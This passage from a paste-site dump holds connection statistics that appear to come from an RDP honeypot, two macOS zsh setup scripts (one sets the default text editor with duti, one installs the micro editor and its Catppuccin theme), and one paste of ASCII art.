    ""AS208312"": 1,
    ""AS56046"": 1,
    ""AS12302"": 4,
    ""AS5384"": 1,
    ""AS267784"": 6,
    ""AS36884"": 7,
    ""AS14061"": 1
  },
  ""isp"": {
    ""Rethem Hosting LLC"": 1,
    ""Aeza International LTD"": 2,
    ""Xhost Internet Solutions LP"": 20,
    ""Cloudie Limited"": 1,
    ""Flyservers S.A."": 12,
    ""Bangladesh Online Ltd"": 1,
    ""ColocationX Ltd."": 6,
    ""Iran Telecommunication Company PJS"": 7,
    ""Google LLC"": 12,
    ""CariNet, Inc."": 10,
    ""Censys, Inc."": 2,
    ""Zayo Bandwidth"": 2,
    ""SS-Net"": 3,
    ""Advin Services LLC"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 28,
    ""Akamai Technologies, Inc."": 9,
    ""Sangmyung University"": 1,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""Consumer-Network"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""Red Byte LLC"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""Vodafone RO"": 4,
    ""Emirates Telecommunications Corporation"": 1,
    ""Provider 36884 Wana Corporate"": 7,
    ""DigitalOcean, LLC"": 1
  },
  ""org"": {
    ""Rethem Hosting LLC"": 1,
    ""Aeza International LTD"": 2,
    ""Dmitriy Panchenko"": 2,
    ""TEN"": 1,
    ""Flyservers S.A"": 6,
    ""Bangladesh Online Ltd"": 1,
    ""Makut Investments"": 3,
    ""Xhost Internet Solutions"": 7,
    ""Telecommunication Company of Esfahan"": 7,
    ""ColocationX Ltd"": 3,
    ""Google Cloud (europe-west2)"": 6,
    ""CariNet, Inc."": 10,
    ""Censys, Inc."": 2,
    ""Microsoft Corporation"": 2,
    ""Xhostis"": 11,
    ""4Media Ltd"": 3,
    ""Advin Services LLC"": 1,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Linode"": 8,
    ""Korean Education Network"": 1,
    ""Aliyun Computing Co., LTD"": 2,
    ""Unknown"": 2,
    ""Tencent Cloud Computing"": 1,
    ""Akamai Technologies, Inc."": 1,
    ""Chang Way Technologies Co. Limited"": 1,
    ""Palo Alto Networks, Inc"": 6,
    ""Ucloud Information Technology"": 27,
    ""China Mobile Communications Corporation"": 1,
    ""Vodafone Romania S.A."": 4,
    ""Emirates Telecommunications Corporation"": 1,
    ""UAB Host Baltic"": 6,
    ""Wana Corporate"": 7,
    ""DigitalOcean, LLC"": 1
  },
  ""regionName"": {
    ""Illinois"": 1,
    ""Hesse"": 4,
    ""Perm Krai"": 2,
    ""Sha Tin"": 1,
    ""Kaunas"": 6,
    ""Dhaka Division"": 1,
    ""Virginia"": 32,
    ""North Holland"": 21,
    ""Isfahan"": 7,
    ""England"": 6,
    ""Nevada"": 10,
    ""Plovdiv"": 3,
    ""California"": 12,
    ""S\u00e3o Paulo"": 1,
    ""New Jersey"": 5,
    ""Seoul"": 1,
    ""Beijing"": 2,
    ""Tokyo"": 1,
    ""Georgia"": 1,
    ""Lesser Poland"": 1,
    ""Jiangsu"": 1,
    ""Bucure\u0219ti"": 4,
    ""Dubai"": 1,
    ""Vilnius"": 6,
    ""Casablanca-Settat"": 7,
    ""Central Singapore"": 1
  },
  ""country"": {
    ""United States"": 61,
    ""Germany"": 4,
    ""Russia"": 2,
    ""Hong Kong"": 1,
    ""Lithuania"": 12,
    ""Bangladesh"": 1,
    ""The Netherlands"": 21,
    ""Iran"": 7,
    ""United Kingdom"": 6,
    ""Bulgaria"": 3,
    ""Brazil"": 1,
    ""South Korea"": 1,
    ""China"": 3,
    ""Japan"": 1,
    ""Poland"": 1,
    ""Romania"": 4,
    ""United Arab Emirates"": 1,
    ""Morocco"": 7,
    ""Singapore"": 1
  },
  ""account"": {
    ""nmap"": 1,
    ""Test"": 18,
    ""hello"": 27,
    ""Domain"": 21,
    ""Administr"": 10,
    ""DFRKKTCgH"": 1,
    ""qFvELU"": 1,
    ""sAELYo"": 1,
    ""eltons"": 5,
    ""administr"": 5,
    ""(empty)"": 6,
    ""Administrator"": 10,
    ""vyOtISaUs"": 1,
    ""jwBcTt"": 1,
    ""CeYKnZ"": 1,
    ""iazp6yij"": 4,
    ""beio"": 1,
    ""eOXuGiqPp"": 1,
    ""GQKeOo"": 1,
    ""YyvXFx"": 1,
    ""Admin"": 9,
    ""Whatuptime.com"": 9,
    ""ugnTwcNRo"": 1,
    ""yQRxuX"": 1,
    ""ruGHbZ"": 1
  },
  ""keyboard"": {
    ""Unknown"": 138
  },
  ""client_build"": {
    ""Unknown"": 138
  },
  ""client_name"": {
    ""Unknown"": 138
  },
  ""ip_type"": {
    ""hosting"": 64,
    ""Unknown"": 69,
    ""hosting & proxy"": 1,
    ""mobile"": 4
  }
}"
nb0Fi3d7,set-editor,tygcrawford,Bash,Sunday 12th of May 2024 06:38:04 PM CDT,"#!/usr/bin/env zsh
set -euo pipefail

if [[ ""$#"" -ne 1 ]]; then
  echo ""Usage: $0 \""<text_editor>\""""
  echo ""Example: $0 \""Visual Studio Code\""""
  exit 1
fi

editor=$1

brew install duti

if ! application=$(osascript -e ""id of app \""$editor\""""); then
  echo ""Error: $1 is not an application""
  exit 1
fi

duti -s $application public.json all
duti -s $application public.plain-text all
duti -s $application public.python-script all
duti -s $application public.shell-script all
duti -s $application public.source-code all
duti -s $application public.text all
duti -s $application public.unix-executable all
duti -s $application public.data all

duti -s $application .c all
duti -s $application .cpp all
duti -s $application .cs all
duti -s $application .css all
duti -s $application .go all
duti -s $application .java all
duti -s $application .js all
duti -s $application .sass all
duti -s $application .scss all
duti -s $application .less all
duti -s $application .vue all
duti -s $application .cfg all
duti -s $application .json all
duti -s $application .jsx all
duti -s $application .log all
duti -s $application .lua all
duti -s $application .md all
duti -s $application .php all
duti -s $application .pl all
duti -s $application .py all
duti -s $application .rb all
duti -s $application .ts all
duti -s $application .tsx all
duti -s $application .txt all
duti -s $application .conf all
duti -s $application .yaml all
duti -s $application .yml all
duti -s $application .toml all

echo ""Success: $1 changed to default text editor"""
iQPbEura,honey treat,Ennortix,PHP,Sunday 12th of May 2024 06:35:52 PM CDT,"                               eeeeeeeeee111111111111111111111111111111111111111114444444444444444444441111111111eeeeeeeeee                                         
                               eeeeeeeeee111111111111111111111111111111111111111114444444444444444444441111111111eeeeeeeeee                                         
                               eeeeeeeeee111111111111111111111111111111111111111114444444444444444444441111111111eeeeeeeeee                                         
                               eeeeeeeeee111111111111111111111111111111111111111114444444444444444444441111111111eeeeeeeeee                                         
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                               11111111111111111111111111111114444444444444444444411111111111111111111111111111111111111111eeeeeeeeee                               
                               11111111111111111111111111111114444444444444444444411111111111111111111111111111111111111111eeeeeeeeee                               
                               11111111111111111111111111111114444444444444444444411111111111111111111111111111111111111111eeeeeeeeee                               
                               11111111111111111111111111111114444444444444444444411111111111111111111111111111111111111111eeeeeeeeee                               "
kGTHt6WJ,micro-install,tygcrawford,Bash,Sunday 12th of May 2024 05:36:27 PM CDT,"#!/usr/bin/env zsh

brew install micro wget jq 

settings=~/.config/micro/settings.json

if [ ! -f $settings ]; then
  yes | micro -clean
fi

echo $(jq '.colorscheme = ""catppuccin-mocha""' $settings) > $settings

if [[ $MICRO_TRUECOLOR != 1 ]]; then 
  echo 'export ""MICRO_TRUECOLOR=1""' >> ~/.zshrc
  export ""MICRO_TRUECOLOR=1""
fi

theme=""https://raw.githubusercontent.com/catppuccin/micro/main/src/catppuccin-mocha.micro""
theme_path=~/.config/micro/colorschemes/catppuccin-mocha.micro

if [ ! -f $theme_path ]; then
  mkdir ~/.config/micro/colorschemes
  wget $theme -P ~/.config/micro/colorschemes
fi"
